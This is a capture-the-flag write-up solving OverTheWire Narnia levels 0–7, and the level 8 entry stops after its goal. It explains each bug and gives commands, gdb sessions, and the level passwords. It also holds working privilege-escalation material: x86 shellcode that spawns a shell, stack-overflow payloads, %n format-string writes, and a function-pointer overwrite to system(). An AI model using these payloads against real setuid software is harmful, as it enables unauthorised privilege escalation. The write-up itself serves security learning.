# OverTheWire Narnia — Solutions

Live solves against `narnia.labs.overthewire.org:2226` in this run. Narnia is about
buffer overflows and shellcode; sources are in `/narnia/`. For each level: goal,
technique and why it works, exact commands, verification. Recordings in
`recordings/narnia/L<n>.cast`.

Verification: each password was accepted by logging in as the next level's account.
---
## Level 0 → narnia1
- **Account:** `narnia0`, password `narnia0` (given by the game).
- **Goal:** The program initialises `long val = 0x41414141` and reads up to 24 characters into `char buf[20]` with `scanf("%24s")`; if `val` becomes `0xdeadbeef` it `setreuid`s to narnia1 and runs `/bin/sh`.
- **Technique and why it works:** `scanf("%24s")` writes up to 24 bytes into a 20-byte buffer, so bytes 21–24 overwrite the adjacent `long val` (stack layout places `val` immediately after `buf`). Sending 20 filler bytes plus the little-endian encoding of `0xdeadbeef` (`\xef\xbe\xad\xde`) makes the comparison true, and the program hands us a shell as narnia1. The payload must be raw bytes (not the literal text), so it is written with `printf`/Python and piped or typed over a PTY.
- **Commands:**
  ```
  ssh narnia0@narnia.labs.overthewire.org -p 2226
  /narnia/narnia0
  # at the prompt send: 20 'A' bytes followed by \xef\xbe\xad\xde
  # then in the shell it spawns:
  id                                   # uid=14001(narnia1)
  cat /etc/narnia_pass/narnia1
  ```
- **Password for narnia1:** `O8dJypubLr`
- **Verification:** logged in as `narnia1` with this password.
- **Recording:** `recordings/narnia/L0.cast`

## Level 1 → narnia2
- **Account:** `narnia1`.
- **Goal:** The program takes the environment variable `EGG`, casts it to a function pointer, and calls it: `ret = (int (*)())getenv("EGG"); ret();`. Put shellcode there.
- **Technique and why it works:** Any string in the environment can be executed if we place valid machine code in it. We set `EGG` to a NOP sled followed by shellcode. The binary is setuid narnia2, so at the call its effective UID is narnia2. Two details matter: (1) the shellcode must first call `setreuid(geteuid(), geteuid())` — otherwise `execve("/bin/sh")` drops the effective UID back to narnia1 (the binary itself does exactly this); (2) the environment must be passed as *bytes* (`os.execve` with a bytes dict) because Python's `os.environ` UTF-8-encodes `\x90` into `\xc2\x90`, corrupting the code. The shellcode: `geteuid` (201), `setreuid(ebx,ebx)` (70), then `execve("/bin/sh")` (11).
- **Commands:**
  ```
  ssh narnia1@narnia.labs.overthewire.org -p 2226
  # set EGG to NOP*200 + [geteuid; setreuid(euid,euid); execve("/bin/sh")] and exec the binary
  id                                  # uid=14002(narnia2)
  cat /etc/narnia_pass/narnia2
  ```
- **Password for narnia2:** `0h8Tj5fxbv`
- **Verification:** logged in as `narnia2` with this password.
- **Recording:** `recordings/narnia/L1.cast`

## Level 2 → narnia3
- **Account:** `narnia2`, password `0h8Tj5fxbv`.
- **Goal:** `main` does `char buf[128]; strcpy(buf, argv[1]);` — an unbounded copy into a 128-byte stack buffer.
- **Technique and why it works:** `strcpy` copies until the NUL, so an `argv[1]` longer than 128 bytes overwrites the saved frame pointer (offset 128) and the return address (offset 132). ASLR is off (`/proc/sys/kernel/randomize_va_space` = 0) and the stack is executable (`readelf -lW` shows `GNU_STACK ... RWE`), so we put a NOP sled + shellcode inside `argv[1]` and return into the sled. The shellcode calls `setreuid(geteuid(), geteuid())` first — the binary is setuid narnia3, so euid is narnia3; without it `execve("/bin/sh")` would drop back to narnia2 — and then `execve("/bin/sh")`. Because the environment shifts the stack, the exploit sweeps candidate return addresses and detects a hit by a `PWN!` marker the shellcode writes before spawning the shell, then re-execs with the found address.

### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** `cat /narnia/narnia2.c` → `char buf[128]; strcpy(buf, argv[1]); printf("%s", buf);`.
2. **Find the buffer and return address in the disassembly.**
   ```
   objdump -d --no-show-raw-insn /narnia/narnia2 | sed -n '/<main>:/,/ret/p'
   ```
   shows `sub $0x80,%esp` and `lea -0x80(%ebp),%eax` before `call strcpy@plt`: the buffer is at `ebp-0x80`, the saved EBP at offset 128 and the return address at offset 132.
3. **Check the binary and the stack.** `file` → setuid ELF 32-bit; `readelf -lW | grep GNU_STACK` → `RWE` (executable stack); `cat /proc/sys/kernel/randomize_va_space` → `0` (no ASLR).
4. **Confirm the layout with gdb.**
   ```
   gdb -batch -ex 'b *0x8049189' -ex 'run AAAA' -ex 'p/x $ebp-0x80' -ex 'p/x $ebp+4' /narnia/narnia2
   # $1 = 0xffffd328   (buffer)      $2 = 0xffffd3ac   (return address)
   ```
   The 4-byte gap between buffer and return address (128 bytes) matches the disassembly.
5. **Write the payload logic as C first, and compile it with gcc.** Before writing assembly, `vim /tmp/l2_proto.c` expresses the same sequence in C — `write(1,"PWN!",4)`, `geteuid()`, `setreuid(euid,euid)`, `setuid(euid)`, `execve("/bin/sh",...)` — and the recording builds it:
   ```
   gcc -m32 -o /tmp/l2_proto /tmp/l2_proto.c
   file /tmp/l2_proto        # ELF 32-bit, matches the target
   /tmp/l2_proto < /dev/null # prints PWN! and execs a shell -> the logic is right
   ```
   Running the prototype proves the syscall order is correct (when run from the narnia2 account euid is narnia2, so it does not prove the privilege gain — that only happens through the setuid binary).
6. **Open `vim /tmp/l2.asm` in the recorded session** (`vim -u NONE -N /tmp/l2.asm`, `i` to enter insert mode) and type the shellcode by hand. It is null-free (argv cannot contain NUL bytes) and does four things:
   ```
   BITS 32
   global _start
   _start:
       ; write(1, "PWN!", 4) -- marker so the address sweep can detect a hit
       xor eax, eax
       push eax
       push 0x214e5750
       mov ecx, esp
       xor ebx, ebx
       inc ebx
       xor edx, edx
       mov dl, 4
       xor eax, eax
       mov al, 4
       int 0x80
       ; euid = geteuid(); setreuid(euid, euid) -- keep euid over execve
       xor eax, eax
       mov al, 201
       int 0x80
       mov ebx, eax
       mov ecx, eax
       xor eax, eax
       mov al, 70
       int 0x80
       ; setuid(euid) -- real, effective AND saved uid, so the privilege
       ; survives execve (plain setreuid leaves saved = narnia2)
       xor eax, eax
       mov al, 201
       int 0x80
       mov ebx, eax
       xor eax, eax
       mov al, 23
       int 0x80
       ; execve("/bin/sh", ["/bin/sh", NULL], NULL)
       xor eax, eax
       push eax
       push 0x68732f2f
       push 0x6e69622f
       mov ebx, esp
       push eax
       push ebx
       mov ecx, esp
       xor edx, edx
       mov al, 11
       int 0x80
   ```
   Notes on why it is written this way: `xor eax,eax; mov al,N` avoids a NUL in the immediate; the string `"PWN!"` is pushed as the little-endian dword `0x214e5750` (`P W N !` in memory); `/bin/sh` is pushed as `0x68732f2f` (`hs//`) and `0x6e69622f` (`nib/`); `push eax; push ebx; mov ecx,esp` builds `argv = {"/bin/sh", NULL}`.
7. **Assemble it with nasm and look at the result.**
   ```
   nasm -f elf32 /tmp/l2.asm -o /tmp/l2.o
   objdump -d -M intel /tmp/l2.o
   ```
   `objdump` shows the exact encoding of every instruction, e.g. `push 0x214e5750` = `68 50 57 4e 21`, `mov al,0xc9` = `b0 c9`, `int 0x80` = `cd 80`.
8. **Extract the raw bytes and print them.**
   ```
   objcopy -O binary --only-section=.text /tmp/l2.o /tmp/l2.bin
   xxd -p /tmp/l2.bin
   # 31c0506850574e2189e131db4331d2b20431c0b004cd8031c0b0c9cd8089
   # c389c131c0b046cd8031c0b0c9cd8089c331c0b017cd8031c050682f2f73
   # 68682f62696e89e3505389e131d2b00bcd80
   wc -c /tmp/l2.bin      # 78
   ```
   The exploit reads this file instead of re-typing bytes, so the payload provably comes from the assembler.
9. **Compile a gcc harness and run the assembled bytes on their own.** `vim /tmp/l2_harness.c` mmaps a page with `PROT_READ|PROT_WRITE|PROT_EXEC`, copies `/tmp/l2.bin` into it, prints the bytes it loaded, and calls it:
   ```
   gcc -m32 -o /tmp/l2_harness /tmp/l2_harness.c
   /tmp/l2_harness /tmp/l2.bin < /dev/null
   # loaded 78 bytes: 31 c0 50 68 50 57 4e 21 ... b0 0b cd 80
   # jumping into the shellcode at 0xf7fba000
   # PWN!            <- the shellcode executed and printed its marker
   ```
   This is the key debugging step: the shellcode is proven to work *before* it goes into `argv[1]`, so if the overflow fails we know the bug is in the payload layout, not in the code.
10. **Write the exploit in `vim /tmp/e_narnia2.py`** — again typed live, not copied from anywhere. It loads the shellcode *from the assembler output* (`open("/tmp/l2.bin","rb").read()`), asserts it contains no NUL and fits in 128 bytes, and defines the layout:
   ```
   def payload_for(addr):
       p = b"\x90" * (128 - len(sc)) + sc      # 50 NOPs, then the 78-byte shellcode
       return p + b"B" * 4 + struct.pack("<I", addr)
   ```
   `probe(addr)` runs `/narnia/narnia2` with `argv[1] = payload_for(addr)`, writes `echo PROBE_OK` to its stdin, and returns true only if `PROBE_OK` comes back. That reply test is essential, because two cheaper tests give false positives:
   * `printf("%s", buf)` echoes the payload, and the payload *contains* the bytes `PWN!`, so grepping the output for `PWN!` reports a hit even when the return address never reaches the shellcode;
   * an address that lands on the `A` (0x41) or `B` (0x42) filler executes harmless `inc ecx`-style bytes and can exit without crashing.
   Only a reply from the shell proves the shellcode actually ran. Addresses whose little-endian encoding contains a NUL byte are skipped (`argv` cannot carry a NUL). The sweep loops `for addr in range(0xffffd000, 0xffffe800, 4)` and stops on the first true reply, then re-runs that address with `id` and `cat /etc/narnia_pass/narnia3` so the transcript shows the shell working as narnia3.
11. **Run it.**
   ```
   python3 /tmp/e_narnia2.py
   # shellcode (78 bytes): 31c0506850574e21...b00bcd80
   # HIT at 0xffffd1f8 after N probes
   # == step 5: run the winning address and use the shell ==
   # uid=14003(narnia3) gid=14002(narnia2)
   # F5AYQwE8PA
   ```
   The sweep landed at **0xffffd1f8**, which is inside the `argv[1]` copy on the stack. That is why the shellcode sits at the *end* of the 128-byte block: its own `push` instructions write below it, into `buf`, so they never overwrite the code where it runs. Step 5 of the script is the same run with `id` and `cat`, so the recorded output proves the shell is narnia3.
- **Password for narnia3:** `F5AYQwE8PA`
- **Verification:** logged in as `narnia3` with this password (`whoami` → `narnia3`).
- **Recording:** `recordings/narnia/L2.cast`

## Level 3 → narnia4
- **Account:** `narnia3`.
- **Goal:** `main` has `char ifile[32]; char ofile[16] = "/dev/null";` then `strcpy(ifile, argv[1])`, opens `ofile` read-write and `ifile` read-only, and copies 31 bytes between them.
- **Technique and why it works:** `strcpy` into the 32-byte `ifile` overflows into the adjacent `ofile` (which sits just above it on the stack, at `ebp-0x18` vs `ebp-0x38`). If `argv[1]` is a path whose first 32 bytes form a real directory prefix and whose remaining bytes are a writable path, then: `ifile` is truncated to those first 32 bytes, while `ofile` becomes the tail. We use `/tmp/` + 27 `A`s + `/tmp/out3` (41 chars): bytes 1–32 are `/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA` and bytes 33+ are `/tmp/out3`. That directory holds a symlink `out3 -> /etc/narnia_pass/narnia4`, and `/tmp/out3` is pre-created writable so `open(ofile, O_RDWR)` succeeds. The setuid program then reads the password (via the symlink) and writes it to `/tmp/out3`, which we can read.
- **Commands:**
  ```
  ssh narnia3@narnia.labs.overthewire.org -p 2226
  D=$(python3 -c 'print("A"*27)')
  mkdir -p "/tmp/$D/tmp"
  ln -sf /etc/narnia_pass/narnia4 "/tmp/$D/tmp/out3"
  touch /tmp/out3; chmod 666 /tmp/out3
  /narnia/narnia3 "/tmp/$D/tmp/out3"
  cat /tmp/out3
  ```
- **Password for narnia4:** `CyWyf6uGWQ`
- **Verification:** logged in as `narnia4` with this password.
- **Recording:** `recordings/narnia/L3.cast`

## Level 4 → narnia5
- **Account:** `narnia4`, password `CyWyf6uGWQ`.
- **Goal:** `main` declares `char buffer[256]`, wipes every environment string (`for(i=0; environ[i]; i++) memset(environ[i], '\0', strlen(environ[i]));`), then does `strcpy(buffer, argv[1])`.
- **Technique and why it works:** the unbounded `strcpy` overflows the 256-byte stack buffer into the saved EBP and return address. Zeroing the environment first is a deliberate hardening attempt: it makes the stack layout identical on every run, so the overflow is fully deterministic (a fixed return address works, no ASLR needed — `randomize_va_space` is 0 and `GNU_STACK` is `RWE`). The shellcode does `geteuid`, `setreuid(euid,euid)`, then `setuid(euid)`, then `execve("/bin/sh")`. **`setuid` is the lesson of this level:** the binary is setuid narnia5, but a plain `setreuid` leaves the *saved* user id at the unprivileged value, so the kernel drops the privilege when `execve` runs the shell. `setuid(euid)` sets real, effective *and saved* ids to narnia5, so the privilege survives the exec.

### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** `cat /narnia/narnia4.c` → `char buffer[256];` env wipe; `strcpy(buffer, argv[1]);`.
2. **Find the buffer and return address.**
   ```
   objdump -d --no-show-raw-insn /narnia/narnia4 | sed -n '/<main>:/,/ret/p'
   ```
   shows `sub $0x104,%esp`, `lea -0x104(%ebp),%eax`, then `call strcpy@plt`: the buffer is at `ebp-0x104`, so the saved EBP is at offset **260** and the return address at offset **264**.
3. **Check the binary and the stack.**
   ```
   ls -l /narnia/narnia4      # -r-sr-x--- 1 narnia5 narnia4
   file /narnia/narnia4       # setuid ELF 32-bit LSB executable, Intel i386
   readelf -lW /narnia/narnia4 | grep -E 'GNU_STACK|LOAD'   # GNU_STACK ... RWE
   readelf -S /narnia/narnia4 | grep -E '\.bss|\.data'      # writable data/bss
   cat /proc/sys/kernel/randomize_va_space                  # 0
   ```
4. **Confirm the layout with gdb.**
   ```
   gdb -batch -ex 'b *0x80491f9' -ex 'run AAAA' -ex 'p/x $ebp-0x104' -ex 'p/x $ebp+4' /narnia/narnia4
   # $1 = 0xffffd2a4   (buffer)      $2 = 0xffffd3ac   (return address)
   ```
   The 260-byte gap matches the disassembly.
5. **Write the shellcode in vim** (`vim /tmp/l4.asm`):
   ```
   BITS 32
   global _start
   _start:
       ; write(1, "PWN!", 4) -- marker so the address sweep can detect a hit
       xor eax, eax
       push eax
       push 0x214e5750
       mov ecx, esp
       xor ebx, ebx
       inc ebx
       xor edx, edx
       mov dl, 4
       xor eax, eax
       mov al, 4
       int 0x80
       ; euid = geteuid(); setreuid(euid, euid)
       xor eax, eax
       mov al, 201
       int 0x80
       mov ebx, eax
       mov ecx, eax
       xor eax, eax
       mov al, 70
       int 0x80
       ; euid = geteuid(); setuid(euid) -- real, effective AND saved uid,
       ; so the privilege survives execve (plain setreuid does not)
       xor eax, eax
       mov al, 201
       int 0x80
       mov ebx, eax
       xor eax, eax
       mov al, 23
       int 0x80
       ; execve("/bin/sh", ["/bin/sh", NULL], NULL)
       xor eax, eax
       push eax
       push 0x68732f2f
       push 0x6e69622f
       mov ebx, esp
       push eax
       push ebx
       mov ecx, esp
       xor edx, edx
       mov al, 11
       int 0x80
   ```
   Syscall numbers: 4 = write, 201 = geteuid, 70 = setreuid, 23 = setuid, 11 = execve.
6. **Assemble and inspect the bytes.**
   ```
   nasm -f elf32 /tmp/l4.asm -o /tmp/l4.o
   objdump -d -M intel /tmp/l4.o          # each instruction's encoding, e.g. push 0x214e5750 = 68 50 57 4e 21
   objcopy -O binary --only-section=.text /tmp/l4.o /tmp/l4.bin
   xxd -p /tmp/l4.bin
   wc -c /tmp/l4.bin                      # 78
   ```
7. **Run the exploit.** `python3 /tmp/e_narnia4.py` reads the assembled bytes from `/tmp/l4.bin` and builds
   `payload = sc + b"\x90"*(260-len(sc)) + b"B"*4 + pack("<I", addr)` — shellcode at the **start** of the buffer, NOPs up to the saved EBP, 4 bytes of saved EBP, 4-byte return address — and sweeps `0xffffd000..0xffffe800` for the `PWN!` marker.

   **The bug we hit and how we found it.** Our first version put the shellcode at the *end* of the buffer (like level 2), and it crashed. `strace -f -e trace=execve,setreuid,setuid,write` showed `write(1,"PWN!",4)`, `setreuid(14004,14004)`, `setuid(14004)`, then `SIGSEGV` — the `execve` never ran. (Under strace the kernel does not honour the setuid bit for a traced process, so the uids read 14004 rather than 14005; the point of the trace is the instruction flow, not the ids.) Disassembling the shellcode (`objdump -d -M intel /tmp/l4.o`) showed why: the marker block leaves `esp` at `buffer+260`, so the `execve` argument `push eax` at offset 0x37 writes to `buffer+256..259` and `push 0x68732f2f` / `push 0x6e69622f` write to `buffer+248..255` — straight into the tail of a shellcode that ends at `buffer+259` (`mov ebx,esp`, `push eax`, `push ebx`, `mov ecx,esp`, `xor edx,edx`, `mov al,0xb`, `int 0x80`). The code then executes overwritten bytes and segfaults (we saw `si_addr=NULL` and `si_addr=0x3722` in two runs — the garbage depends on what was pushed). In level 2 the sweep address lands in the `argv[1]` copy *above* the buffer, so its pushes never touch the running code; in level 4 the code runs inside the buffer itself, so the pushes hit it. The fix is to place the shellcode at offset 0 of the buffer, far below the push region (`buffer+240..251`).
8. **Use the shell.**
   ```
   id                        # uid=14005(narnia5) gid=14004(narnia4)
   cat /etc/narnia_pass/narnia5
   ```
- **Password for narnia5:** `4VhyE9TRcd`
- **Verification:** logged in as `narnia5` with this password (`whoami` → `narnia5`).
- **Recording:** `recordings/narnia/L4.cast`

## Level 5 → narnia6
- **Account:** `narnia5`, password `4VhyE9TRcd`.
- **Goal:** `main` has `int i = 1; char buffer[64];` and does `snprintf(buffer, sizeof buffer, argv[1]);` — **`argv[1]` is used as the format string**. If `i == 500` the program prints `GOOD`, does `setreuid(geteuid(),geteuid())` and runs `system("/bin/sh")`. On failure it prints the buffer and `i = %d (%p)`, leaking the address of `i`.
- **Technique and why it works:** a format-string bug. `%n` writes the number of characters printed so far into the pointer passed as the corresponding argument. The trick is that `snprintf`'s *destination* is the same 64-byte buffer that overlaps the varargs area on the stack: with the argument string being the format string, vararg *k* lives at `buffer + 4*(k-1)`. So if we write 56 filler bytes followed by the 4-byte address of `i`, that address becomes vararg 15. Then `%440c` prints 440 characters (56 filler + 4 address + 440 = 500), and `%15$n` writes 500 into `i`. `i` is at `ebp-0x8` and `buffer` at `ebp-0x48`, so `i` is exactly `buffer+64`.

### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** `cat /narnia/narnia5.c` → `snprintf(buffer, sizeof buffer, argv[1]);`, `if(i==500)` → `system("/bin/sh")`; failure prints `i = %d (%p)`.
2. **Locate the variables.** `objdump -d --no-show-raw-insn /narnia/narnia5 | sed -n '/<main>:/,/ret/p'`:
   ```
   movl $0x1,-0x8(%ebp)          # i = 1, at ebp-0x8
   lea -0x48(%ebp),%eax          # buffer, at ebp-0x48
   push %eax; push $0x40; push argv[1]; call snprintf@plt
   ```
   So `i` is exactly 64 bytes above `buffer`.
3. **Check protections.** `file` → setuid ELF 32-bit; `readelf -lW | grep GNU_STACK` → `RW` (non-executable stack, irrelevant here — this is not a code-injection level).
4. **See the layout in gdb.**
   ```
   gdb -batch -ex 'b *0x80491e3' -ex 'run AAAA' -ex 'p/x $ebp-0x8' -ex 'p/x $ebp-0x48' -ex 'p $esp' -ex 'x/12wx $esp' /narnia/narnia5
   # $1 = 0xffffd3a0   (i)      $2 = 0xffffd360   (buffer)      $3 = 0xffffd354 (esp)
   # 0xffffd354: 0xffffd360 0x00000040 0xffffd5fc 0x00000040
   ```
   The first vararg slot (`esp+4`) is `0x40`, the second (`esp+8`) is the argv pointer — and `buffer` itself sits at `esp+12`. That is why the format string reads its own output: vararg *k* = `buffer + 4*(k-1)`.
5. **Probe the format string.** `/narnia/narnia5 'AAAA.%08x.%08x.%08x.%08x.%08x.%08x'` prints the arguments; the values shown are bytes of the string itself, confirming the overlap.
6. **The address of `i` moves with the environment.** The program helpfully prints `i = 1 (0xffffd3c0)`, so the exploit first runs the binary with an argument of the *same length* and the *same (empty) environment*, reads `&i` from that output, and then builds the real payload with it. This is the general fix for stack-address dependence without ASLR (here ASLR is 0, but the address still depends on the environment size).
7. **Build the payload** (in `L5.py`):
   ```
   fmt = b"A" * 56 + struct.pack("<I", addr) + b"%440c%15$n"
   ```
   - 56 filler bytes put the 4-byte address at offset 56, i.e. `buffer+56`, which is vararg 15.
   - `%440c` consumes vararg 1 (the integer `0x40`, i.e. 64) as a character and pads to 440 characters. The total output so far is 56 + 4 + 440 = **500**.
   - `%15$n` stores that 500 into the pointer at vararg 15, which is `&i`.
   - `snprintf` writes at most 64 bytes into `buffer`, and `buffer[63] = 0` truncates the output — the `%n` has already fired by then.
8. **Run it.** `python3 /tmp/e_narnia5.py` probes, prints `probe says &i = 0xffffddd0`, then execs the binary. Output:
   ```
   Change i's value from 1 -> 500. GOOD
   ```
   and the program drops into a shell.
12. **Use the shell.**
   ```
   id                        # uid=14006(narnia6) gid=14005(narnia5)
   cat /etc/narnia_pass/narnia6
   ```
- **Password for narnia6:** `uK3ikaZLxB`
- **Verification:** logged in as `narnia6` with this password (`whoami` → `narnia6`).
- **Recording:** `recordings/narnia/L5.cast`

## Level 6 → narnia7
- **Account:** `narnia6`, password `uK3ikaZLxB`.
- **Goal:** `main` declares `char b1[8], b2[8]; int (*fp)(char *) = (int(*)(char *))&puts;`, wipes the environment, zeroes `argv[3..]`, then `strcpy(b1, argv[1]); strcpy(b2, argv[2]);`. A guard rejects stack pointers: `if(((unsigned long)fp & 0xff000000) == get_sp()) exit(-1);` where `get_sp()` returns `esp & 0xff000000` (`0xff000000` on this host). Then `setreuid(geteuid(), geteuid()); fp(b1);`.
- **Technique and why it works:** `strcpy(b1, argv[1])` overflows the 8-byte `b1` into the adjacent function pointer `fp`, so we overwrite `fp` and the program calls our chosen address with `b1` as the argument. The guard only rejects pointers whose top byte is `0xff`, i.e. stack addresses; a libc address (`0xf7...`) passes. ASLR is off, so `system`'s address is fixed: `ldd` gives libc32 base `0xf7d6d000`, `nm -D /usr/lib32/libc.so.6 | grep -w system` gives offset `0x53ce0`, so `system = 0xf7dc0ce0`. `fp(b1)` becomes `system(b1)`. Since `b1` is 8 command bytes followed by the 4 address bytes with no NUL between them, the command is written as `"sh;#AAAA"` — the shell `#` comments out the trailing address bytes, and we get an interactive shell. `b2` must be short: `b2[8]` ends exactly at `b1[0]`, so a long `b2` would make `strcpy`'s NUL terminator zero out `b1`'s first byte (which we discovered in gdb: `x/s $ebp-0x14` showed `""` after a 8-byte `b2`).

### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** `cat /narnia/narnia6.c`: `char b1[8], b2[8]; int (*fp)(char *)=(int(*)(char *))&puts;`; the stack-pointer guard; `fp(b1)`.
2. **Locate the variables.** `objdump -d --no-show-raw-insn /narnia/narnia6 | sed -n '/<main>:/,/ret/p'`:
   ```
   movl $0x8049070,-0xc(%ebp)    # fp = &puts, at ebp-0xc
   lea -0x14(%ebp),%eax; call strcpy   # strcpy(b1, argv[1]); b1 at ebp-0x14
   lea -0x1c(%ebp),%eax; call strcpy   # strcpy(b2, argv[2]); b2 at ebp-0x1c
   and $0xff000000,%eax                # get_sp() high byte
   call *%eax                          # fp(b1)
   ```
   So `b1+8 = fp` (0x14 - 0x0c = 8).
3. **Check protections and layout.** `file` → setuid ELF 32-bit; `readelf -lW | grep GNU_STACK` → `RW`; gdb at the first `strcpy`:
   ```
   gdb -batch -ex 'b *0x80492cb' -ex 'run AAAA BBBB' -ex 'p/x $ebp-0x14' -ex 'p/x $ebp-0x1c' -ex 'p/x $ebp-0xc' -ex 'x/8wx $ebp-0x20' /narnia/narnia6
   # $1 = 0xffffdbc4 (b1)  $2 = 0xffffdbbc (b2)  $3 = 0xffffdbcc (fp)
   ```
   `0xffffdbc4 + 8 = 0xffffdbcc` — the overflow hits `fp` exactly.
4. **Watch what `strcpy(b2,...)` does to `b1`.** Breaking at the call and printing:
   ```
   gdb -batch -ex 'b *0x804931f' -ex 'run AAAAAAAA BBBBBBBB' -ex 'x/s $ebp-0x14' -ex 'p/x *(unsigned int*)($ebp-0xc)' /narnia/narnia6
   # 0xffffdbc4: ""          <- b1 was zeroed by b2's NUL!
   # $1 = 0x8049000         <- fp reset to the PLT address
   ```
   `b2[8]` ends at `b1[0]`, so the NUL written by `strcpy(b2, argv[2])` lands on `b1`'s first byte. That is why `b2` must be a single character.
5. **Find `system`.** 
   ```
   ldd /narnia/narnia6                              # libc.so.6 => /usr/lib32/libc.so.6 (0xf7d6d000)
   nm -D /usr/lib32/libc.so.6 | grep -w system      # 00053ce0 W system@@GLIBC_2.0
   python3 -c 'print(hex(0xf7d6d000+0x53ce0))'       # 0xf7dc0ce0
   ```
   The top byte is `0xf7`, not `0xff`, so it passes the guard.
6. **Build the payload** (`L6.py`):
   ```
   system = 0xf7dc0ce0
   b1 = b"sh;#AAAA" + struct.pack("<I", system)   # 8 command bytes + 4-byte fp
   os.execve(b"/narnia/narnia6", [b"/narnia/narnia6", b1, b"B"], {})
   ```
   `fp(b1)` → `system("sh;#<address bytes>")` → the `#` comments out the address bytes → interactive shell.
7. **Run it.** `python3 /tmp/e_narnia6.py` prints `fpMARK -> system = 0xf7dc0ce0` (the marker the driver waits for), then the shell comes up.
8. **Use the shell.**
   ```
   id                        # uid=14007(narnia7) gid=14006(narnia6)
   cat /etc/narnia_pass/narnia7
   ```
- **Password for narnia7:** `Hwsfol90tt`
- **Verification:** logged in as `narnia7` with this password (`whoami` → `narnia7`).
- **Recording:** `recordings/narnia/L6.cast`

## Level 7 → narnia8
- **Account:** `narnia7`, password `Hwsfol90tt`.
- **Goal:** `vuln()` declares `char buffer[128]; int (*ptrf)();`, sets `ptrf = goodfunction`, prints `goodfunction()`, `hackedfunction()` and `&ptrf`, then does `snprintf(buffer, sizeof buffer, format)` where `format` is `argv[1]`, and finally `return ptrf();`. If `ptrf` points at `hackedfunction`, that function does `setreuid(geteuid(),geteuid())` and `system("/bin/sh")`.
- **Technique and why it works:** a format-string bug combined with a function-pointer overwrite. `ptrf` lives at `ebp-0x84`, *below* `buffer` at `ebp-0x80`, so a buffer overflow cannot reach it; the only way is `%n`. The program helpfully prints `hackedfunction`'s address and the address of `ptrf`, so we do not have to guess: we probe with an argument of the same length and the same empty environment, read both addresses from the output, then build the real payload. `snprintf`'s varargs start at `esp+12`: with an empty environment vararg1 is `ptrf`'s current value, vararg2 is `buffer[0..3]` and vararg3 is `buffer[8..11]`. The format string itself (`argv[1]`) lives far up the stack at **arg index 152** — measured live, and stable across runs because the argv/env layout is fixed with an empty environment. So we put the two target addresses in the format string's first 8 bytes, where they are varargs 152 and 153, and write the two 16-bit halves of `hackedfunction` with `%152$hn` and `%153$hn`. `snprintf` stops writing at 128 bytes, but `%n` still fires with the full count, so the large `%<count>c` widths work.

### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** `cat /narnia/narnia7.c`: `char buffer[128]; int (*ptrf)();`, `snprintf(buffer, sizeof buffer, format);`, `return ptrf();`, and `hackedfunction()` runs a shell.
2. **Locate the variables.** `objdump -d --no-show-raw-insn /narnia/narnia7 | sed -n '/<vuln>:/,/ret/p'`:
   ```
   movl $0x80492ea,-0x84(%ebp)    # ptrf at ebp-0x84, = goodfunction
   lea -0x80(%ebp),%eax           # buffer at ebp-0x80
   push 0x8(%ebp); push $0x80; push %eax; call snprintf@plt
   mov -0x84(%ebp),%eax; call *%eax
   ```
   `ptrf` (ebp-0x84) is 4 bytes *below* `buffer` (ebp-0x80), so writing forward into `buffer` never reaches it.
3. **Check the layout in gdb.** At the `snprintf` call:
   ```
   gdb -batch -ex 'b *0x8049298' -ex 'run AAAA' -ex 'p/x $esp' -ex 'x/4wx $esp' -ex 'p/x $ebp-0x84' -ex 'p/x $ebp-0x80' -ex 'p/x *(char**)($esp+8)' /narnia/narnia7
   # esp = 0xffffdd6c
   # 0xffffdd6c: 0xffffdd7c (buffer)  0x00000080 (size)  0xffffdfd4 (format)  0x080492ea (ptrf value)
   # $ebp-0x84 = 0xffffdd68 (ptrf)   $ebp-0x80 = 0xffffdd7c (buffer)
   ```
   So vararg1 = `0x080492ea` (ptrf's value), vararg2 = `buffer[0..3]` (zeros), vararg3 = `buffer[8..11]`.
4. **Measure where the format string's own bytes live.** The format string is at `0xffffdfd4`, which is `0x268` bytes above `esp+12`; `0x268 / 4 = 154` in gdb's layout. In the real run (empty environment) the working index is **152** — found by sweeping: for each candidate `k`, probe `&ptrf` with an argument of exactly the payload's length (the stack shifts with argument length!), then run the real two-write payload and look for `Way to go`. `k=152` produced it.
5. **Understand the two-write payload** (`L7.py`):
   ```
   fmt = pack("<I", ptrf+2) + pack("<I", ptrf) \
       + b"%" + str(hi-8) + b"c%152$hn" + b"%" + str(lo-hi) + b"c%153$hn"
   ```
   - `fmt[0..3] = &ptrf+2` is vararg 152; `fmt[4..7] = &ptrf` is vararg 153.
   - The 8 address bytes are printed first (count 8), then `%<hi-8>c` pads to `hi`, `%152$hn` writes `hi` into the high half of `ptrf`; `%<lo-hi>c` pads to `lo`, `%153$hn` writes `lo` into the low half.
   - `hi = 0x0804`, `lo = 0x930f` for `hackedfunction = 0x804930f`, and `hi < lo`, so a single pass suffices.
6. **Run it.** `python3 /tmp/e_narnia7.py` prints `hackedfunction = 0x804930f`, `&ptrf = 0xffffdd68`, then the format string; the binary prints `Way to go!!!!` and drops into a shell.
7. **Use the shell.**
   ```
   id                        # uid=14008(narnia8) gid=14007(narnia7)
   cat /etc/narnia_pass/narnia8
   ```
- **Password for narnia8:** `aToTvI5BYB`
- **Verification:** logged in as `narnia8` with this password (`whoami` → `narnia8`).
- **Recording:** `recordings/narnia/L7.cast`

## Level 8 → narnia9 (final level)
- **Account:** `narnia8`, password `aToTvI5BYB`.
- **Goal:** `func()` does `char *blah = b; char bok[20]; memset(bok,0,20); for(i=0; blah[i] != '\0'; i++) bok[i] = blah[i]; printf("%s\n", bok);` with `i` a global. The unbounded copy overflows `bok`.
